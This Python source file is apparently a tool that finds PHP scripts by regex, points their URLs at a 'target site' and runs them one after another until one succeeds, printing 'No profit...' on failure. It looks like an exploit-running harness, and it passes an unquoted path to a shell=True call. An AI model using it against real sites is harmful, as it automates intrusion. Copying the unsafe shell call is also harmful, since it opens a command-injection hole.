import os
import argparse
from re import compile
from shutil import copy2
import configparser
from subprocess import Popen, PIPE

config = configparser.ConfigParser()
config.read('config.conf')


class Finder(object):
    def __init__(self, path):
        self.path = path

    def get_all_files(self):
        for path, _, files in os.walk(self.path):
            for name in files:
                yield os.path.join(path, name)

    def get_only(self, name):
        for item in self.get_all_files():
            if name in item:
                yield item

    def search(self, pattern, names, sort=True):
        result = []
        pattern = compile(pattern)
        for item in self.get_only(names):
            try:
                with open(item, 'r') as file:
                    if pattern.search(file.read()):
                        result.append(item)
            except Exception as ex:
                print(ex)
        if sort:
            crtime = {}
            for file in result:
                crtime[(os.path.getmtime(file))] = file
            result = []
            for time in sorted(crtime, reverse=True):
                result.append(crtime[time])
        return result


class FileWorker(object):
    def __init__(self, path):
        self.path = path if path[-1] == '/' else path + '/'
        self.rex_url = compile(r'http[s]?://([-\d\w.]+)')
        self.dst = self.path

    def copy_file(self, src, dst):
        if src:
            self.dst = self.path + self.rex_url.search(dst).group(1)
            if not os.path.exists(self.dst):
                os.mkdir(self.dst)
            copy2(src, self.dst)
        else:
            print('No files copy')

    def change_items_in_file(self, pattern):
        file = self.dst + '/' + 'index.php'
        if os.path.isfile(file):
            with open(file) as r_file:
                tmp_file = self.rex_url.sub(pattern, r_file.read())
            with open(file, 'w') as w_file:
                w_file.write(tmp_file)
            return file


class StarterPHP(object):
    def __init__(self):
        self.interpreter = config.get('Main', 'interpreter')

    def run(self, file):
        try:
            rez = Popen(self.interpreter + ' ' + file, shell=True, stdout=PIPE, stderr=PIPE)
            if not rez.stdout.read() and not rez.stderr.read():
                return True
        except Exception as ex:
            print(ex)
            print('Error run script')


if __name__ == '__main__':
    argpars = argparse.ArgumentParser(prog='finger', usage='%(prog)s [options]', epilog='Finger parser half brain')
    argpars.add_argument('-u', '--url', help='Url target site')
    argpars.add_argument('-r', '--rex', default='', help='Regular expression pattern for search')
    argpars.add_argument('-p', '--path', default='.', help='Path work')

    args = vars(argpars.parse_args())

    finder = Finder(config.get('Main', 'path_files'))
    runner_php = StarterPHP()
    file_work = FileWorker(args.get('path'))
    files = finder.search(args.get('rex'), config.get('Main', 'search_files'), sort=True)
    for file in files:
        file_work.copy_file(file, args.get('url'))
        current_file = file_work.change_items_in_file(args.get('url'))
        if current_file:
            if runner_php.run(current_file):
                print('Finished Success!')
                break
            else:
                print('No profit...')
